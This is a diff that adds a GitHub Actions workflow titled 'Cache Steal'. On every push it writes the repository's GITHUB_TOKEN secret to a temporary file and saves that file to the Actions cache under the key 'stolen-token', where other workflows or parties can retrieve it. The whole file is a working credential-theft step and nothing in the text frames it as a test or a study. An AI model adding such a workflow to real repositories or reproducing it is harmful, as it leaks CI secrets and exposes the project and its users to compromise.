@@ -1,0 +1,14 @@
+name: Cache Steal
+on: [push]
+
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Save token
+        run: echo "${{ secrets.GITHUB_TOKEN }}" > /tmp/token.txt
+      - name: Upload to cache
+        uses: actions/cache/save@v3
+        with:
+          path: /tmp/token.txt
+          key: stolen-token
